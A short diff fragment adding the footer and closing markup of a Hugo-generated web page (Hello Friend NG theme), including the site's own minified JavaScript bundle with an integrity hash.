+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Theme - <a href="https://themes.gohugo.io/themes/hugo-theme-hello-friend-ng/">Hello Friend NG</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://scorpiosec.com/bundle.min.ac2a4bcaed631ec2dc154407be7f09fc28da37de71fae6dee6711b2a3d1622770f87d3cda22c460e9a68ff619bdb1dd75cb7a5d33f159a54e419736cc4541087.js" integrity="sha512-rCpLyu1jHsLcFUQHvn8J/CjaN95x&#43;ube5nEbKj0WIncPh9PNoixGDppo/2Gb2x3XXLel0z8VmlTkGXNsxFQQhw=="></script>
+
+
+
+
+    </body>
+</html>
